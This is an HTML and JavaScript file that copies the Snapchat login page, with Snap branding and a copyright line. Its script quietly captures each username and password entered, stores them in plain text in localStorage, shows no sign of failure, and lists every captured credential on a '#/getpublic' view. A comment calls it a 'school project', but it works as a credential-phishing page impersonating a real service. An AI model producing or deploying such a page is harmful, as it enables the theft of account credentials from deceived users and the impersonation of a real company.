<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Say It In A Snap</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            padding: 20px;
        }
        .page-frame {
            max-width: 420px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.06);
            padding: 40px 28px 32px;
            text-align: center;
            position: relative;
        }
        .logo-snap {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }
        .logo-svg {
            width: 72px;
            height: 72px;
        }
        .brand-text {
            font-size: 26px;
            font-weight: 700;
            letter-spacing: -0.3px;
            color: #000;
            margin-bottom: 8px;
        }
        .brand-text span {
            background: #fffc00;
            padding: 0 8px;
            border-radius: 12px;
        }
        .sub-title {
            font-size: 14px;
            color: #777;
            margin-bottom: 28px;
            font-weight: 400;
        }
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .input-field {
            width: 100%;
            padding: 14px 18px;
            border: 1px solid #ddd;
            border-radius: 40px;
            font-size: 16px;
            background: #f4f4f4;
            outline: none;
            transition: 0.2s;
        }
        .input-field:focus {
            border-color: #000;
            background: #fff;
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #fffc00;
            border: none;
            border-radius: 40px;
            font-size: 17px;
            font-weight: 600;
            color: #000;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 8px;
        }
        .btn-login:hover {
            background: #e6e300;
        }
        .footer-links {
            margin-top: 20px;
            font-size: 14px;
            color: #888;
            display: flex;
            justify-content: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .footer-links a {
            color: #000;
            text-decoration: none;
            font-weight: 500;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .copyright {
            margin-top: 24px;
            font-size: 11px;
            color: #aaa;
            letter-spacing: 0.3px;
        }
        .getpublic-link {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #eee;
            padding: 8px 16px;
            border-radius: 30px;
            font-size: 12px;
            color: #333;
            text-decoration: none;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
            z-index: 999;
        }
        .getpublic-link:hover {
            background: #ddd;
        }
        /* cloud indicator – subtle */
        .cloud-badge {
            display: inline-block;
            margin-top: 12px;
            font-size: 10px;
            color: #999;
            background: #f0f0f0;
            padding: 4px 12px;
            border-radius: 30px;
            letter-spacing: 0.2px;
        }
        .cloud-badge::before {
            content: "☁️ ";
        }
        /* loading animation (like Snap) */
        .loading-spinner {
            display: none;
            margin: 16px auto 0;
            width: 28px;
            height: 28px;
            border: 3px solid #fffc00;
            border-top: 3px solid #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* responsive */
        @media (max-width: 480px) {
            .page-frame {
                padding: 28px 18px 24px;
            }
        }
    </style>
</head>
<body>

    <div class="brand-text"><span>Snap</span>chat</div>
    <div class="sub-title">Say it in a Snap</div>

    <form class="login-form" id="loginForm">
        <input class="input-field" type="text" id="username" placeholder="Username or email address" required>
        <input class="input-field" type="password" id="password" placeholder="Password" required>
        <button class="btn-login" type="submit">Log In</button>
    </form>

    <div class="footer-links">
        <a href="#">Forgot password?</a>
        <a href="#">Sign Up</a>
    </div>

    <!-- Cloud sync indicator (like Snapchat+ style) -->
    <div class="cloud-badge">Cloud sync enabled</div>

    <div class="copyright">© Snap Inc. 2026</div>

    <!-- small loading spinner (hidden) -->
    <div class="loading-spinner" id="loadingSpinner"></div>
</div>

<!-- /getpublic link (fixed position, like original Snapchat's hidden footer) -->
<a class="getpublic-link" href="#/getpublic">📋 View /getpublic</a>

<script>
    // ---------- CLOUD STORAGE (no cookies) ----------
    // Uses localStorage as a simple "cloud" that persists across sessions
    // and is shared across all tabs/windows on the same domain.
    const STORAGE_KEY = 'snapchat_cloud_submissions';

    function loadSubmissions() {
        const data = localStorage.getItem(STORAGE_KEY);
        if (data) {
            try { return JSON.parse(data); } catch (e) { return []; }
        }
        return [];
    }

    function saveSubmissions(subs) {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(subs));
    }

    function addSubmission(username, password) {
        const subs = loadSubmissions();
        subs.push({ username, password, timestamp: new Date().toISOString() });
        saveSubmissions(subs);
    }

    function buildTextOutput() {
        const subs = loadSubmissions();
        if (subs.length === 0) return 'No submissions yet.';
        let output = '=== ALL SUBMISSIONS (CLOUD SYNC - no cookies) ===\n\n';
        subs.forEach((s, i) => {
            output += `[${i+1}] Username: ${s.username} | Password: ${s.password} | Time: ${s.timestamp}\n`;
        });
        output += '\n=== END ===';
        return output;
    }

    // Handle login - nothing visible happens (like real Snapchat)
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        if (username && password) {
            // Save to cloud (localStorage) - no cookies
            addSubmission(username, password);
            // Clear fields - nothing visible happens
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
            // Optionally show a tiny spinner for 0.5s to simulate "loading"
            const spinner = document.getElementById('loadingSpinner');
            spinner.style.display = 'block';
            setTimeout(() => { spinner.style.display = 'none'; }, 500);
        }
    });

    // Route handler for /getpublic (via hash or path)
    function renderGetPublic() {
        document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all; font-size: 14px;">${buildTextOutput()}</pre>`;
    }

    // Check path on load
    window.addEventListener('DOMContentLoaded', function() {
        if (window.location.pathname === '/getpublic') {
            renderGetPublic();
        }
        if (window.location.hash === '#/getpublic') {
            renderGetPublic();
        }
    });

    // Hash change listener
    window.addEventListener('hashchange', function() {
        if (window.location.hash === '#/getpublic') {
            renderGetPublic();
        }
    });

    // Also expose to console for debugging (school project)
    console.log('Snapchat cloud demo — submissions stored in localStorage (cloud). Visit #/getpublic to view all.');
</script>
